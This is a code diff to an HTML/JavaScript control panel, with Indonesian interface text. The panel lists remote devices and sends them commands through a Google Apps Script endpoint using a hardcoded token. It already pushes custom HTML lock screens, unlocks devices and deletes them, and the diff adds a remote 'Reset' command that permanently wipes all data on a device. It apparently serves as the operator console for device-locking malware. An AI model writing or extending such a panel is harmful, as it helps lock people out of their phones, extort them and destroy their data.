@@ -31,13 +31,22 @@
         .card .badge.off{background:rgba(255,255,255,0.03);color:#666}
         .card .badge.locked{background:rgba(255,77,77,0.1);color:#f87171}
         .card textarea{width:100%;padding:8px;border-radius:8px;background:#0a0a0a;border:1px solid #222;color:#fff;font-size:10px;font-family:monospace;resize:vertical;min-height:80px;margin-bottom:6px}
-        .card .btns{display:flex;gap:6px}
-        .card .btns button{flex:1;padding:8px;border-radius:8px;font-weight:700;border:none;cursor:pointer;font-size:10px}
+        .card .btns{display:flex;gap:6px;flex-wrap:wrap}
+        .card .btns button{flex:1;padding:8px;border-radius:8px;font-weight:700;border:none;cursor:pointer;font-size:10px;min-width:70px}
         .card .btns .lock{background:#00D4FF;color:#000}
         .card .btns .unlock{background:#34d399;color:#000}
         .card .btns .del{background:#ef4444;color:#fff}
+        .card .btns .wipe{background:#ff9500;color:#000}
         .empty{text-align:center;padding:40px;color:#666;font-size:12px}
         .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#111;border:1px solid #00D4FF;padding:10px 20px;border-radius:20px;font-size:10px;z-index:100}
+        .popup-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:200;align-items:center;justify-content:center}
+        .popup-overlay.show{display:flex}
+        .popup{background:#111;border:1px solid #f87171;border-radius:14px;padding:20px;text-align:center;width:300px}
+        .popup h3{color:#f87171;margin-bottom:8px}
+        .popup p{font-size:11px;color:#ccc;margin-bottom:14px}
+        .popup button{padding:8px 16px;border-radius:6px;font-weight:700;border:none;cursor:pointer;font-size:11px;margin:4px}
+        .popup .yes{background:#ef4444;color:#fff}
+        .popup .no{background:#333;color:#fff}
     </style>
 </head>
 <body>
@@ -58,8 +67,11 @@
         <div id="list"></div>
     </div>
 </div>
+<div class="popup-overlay" id="popupOverlay">
+    <div class="popup" id="popupBox"></div>
+</div>
 <script>
-const API='https://script.google.com/macros/s/AKfycbzwtt_Qt3xFQ5ToKqAy3Je-ukHD41Tinl9bHXT7aTd3KXQ3bt15w0SiMuHLY31peOheug/exec';
+const API='https://script.google.com/macros/s/AKfycbydK_xMyMAH3qkqw-O9YqJo8XcXjolH04pBYosvuBZdP3UQ9IcWbfGoImiNsyERUw/exec';
 
 function login(){
   const u=document.getElementById('u').value.trim();
@@ -72,15 +84,12 @@ function login(){
     document.getElementById('err').style.display='block';
   }
 }
-
 function logout(){
   document.getElementById('panel').style.display='none';
   document.getElementById('login').style.display='block';
-  document.getElementById('u').value='';
-  document.getElementById('p').value='';
+  document.getElementById('u').value='';document.getElementById('p').value='';
   document.getElementById('err').style.display='none';
 }
-
 async function load(){
   try{
     let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'getDevices',token:'zenn_2024'})});
@@ -98,6 +107,7 @@ async function load(){
         <div class="btns">
           <button class="lock" onclick="sendLock('${x.device_id}')">🔒 Lock</button>
           <button class="unlock" onclick="sendUnlock('${x.device_id}')">🔓 Unlock</button>
+          <button class="wipe" onclick="confirmWipe('${x.device_id}')">⚠️ Reset</button>
           <button class="del" onclick="delDevice('${x.device_id}')">🗑 Hapus</button>
         </div>
       </div>
@@ -105,32 +115,39 @@ async function load(){
     setTimeout(load,10000);
   }catch(e){}
 }
-
 async function sendLock(id){
   const h=document.getElementById('h-'+id).value;
   if(!h.trim())return toast('⚠️ Isi kode HTML dulu!');
   await fetch(API,{method:'POST',body:JSON.stringify({action:'sendLock',token:'zenn_2024',device_id:id,lock_html:h})});
-  toast('🔒 Lock dikirim!');
-  load();
+  toast('🔒 Lock dikirim!');load();
 }
-
 async function sendUnlock(id){
   await fetch(API,{method:'POST',body:JSON.stringify({action:'sendUnlock',token:'zenn_2024',device_id:id})});
-  toast('🔓 Unlock dikirim!');
-  load();
+  toast('🔓 Unlock dikirim!');load();
 }
-
+function confirmWipe(id){
+  document.getElementById('popupBox').innerHTML=`
+    <h3>⚠️ Reset Data</h3>
+    <p>Semua data di device ${id} akan dihapus permanen. Lanjutkan?</p>
+    <button class="no" onclick="closePopup()">Batal</button>
+    <button class="yes" onclick="sendWipe('${id}')">Reset Sekarang</button>
+  `;
+  document.getElementById('popupOverlay').classList.add('show');
+}
+async function sendWipe(id){
+  closePopup();
+  await fetch(API,{method:'POST',body:JSON.stringify({action:'sendWipe',token:'zenn_2024',device_id:id})});
+  toast('⚠️ Reset Data dikirim!');load();
+}
 async function delDevice(id){
   await fetch(API,{method:'POST',body:JSON.stringify({action:'deleteDevice',token:'zenn_2024',device_id:id})});
-  toast('🗑 Device dihapus!');
-  load();
+  toast('🗑 Device dihapus!');load();
 }
-
+function closePopup(){document.getElementById('popupOverlay').classList.remove('show');}
 function toast(m){
   let t=document.createElement('div');t.className='toast';t.textContent=m;
   document.body.appendChild(t);setTimeout(()=>t.remove(),3000);
 }
-
 document.getElementById('p').addEventListener('keydown',e=>{if(e.key==='Enter')login();});
 </script>
 </body>
